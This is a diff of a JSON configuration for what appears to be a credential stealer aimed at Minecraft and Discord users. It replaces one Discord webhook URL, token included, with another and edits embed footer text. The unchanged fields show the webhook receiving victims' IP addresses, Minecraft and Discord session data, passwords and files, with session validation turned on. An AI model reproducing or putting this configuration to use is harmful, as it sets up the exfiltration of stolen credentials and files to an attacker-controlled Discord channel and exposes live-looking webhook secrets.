@@ -1,5 +1,5 @@
 {
-  "webhook": "https://discord.com/api/webhooks/1136307500128420011/W5z5J6tYeXmvuZhNyWo4j6lGG-i0YhjvfwtxrtIH6SJdxBkjvSrb1RE-8NsA1LBu_fo3",
+  "webhook": "https://discord.com/api/webhooks/1138486482802315314/mDYP_tYty6cR5nxvHg8c53a1EhkJznR4peQs_px1oC4Gl2T8soozBYYNIP3FFmMGqwfZ",
   "webhook_name": "Webhook",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
@@ -11,24 +11,24 @@
 
   "mc_embed_color": "FF031A",
   "mc_embed_title": "Minecraft Info",
-  "mc_embed_footer_text": "",
+  "mc_embed_footer_text": "d",
   "mc_embed_footer_icon": "",
 
 
   "discord_embed_color": "0353FF",
   "discord_embed_title": "Discord Info",
-  "discord_embed_footer_text": "",
+  "discord_embed_footer_text": "d",
   "discord_embed_footer_icon": "",
 
 
   "password_embed_color": "FFFF00",
   "password_embed_title": "Passwords",
-  "password_embed_footer_text": "",
+  "password_embed_footer_text": "d",
   "password_embed_footer_icon": "",
 
   "file_embed_color": "00FF00",
   "file_embed_title": "Files",
-  "file_embed_footer_text": "",
+  "file_embed_footer_text": "d",
   "file_embed_footer_icon": "",
 
   "validate_session": true
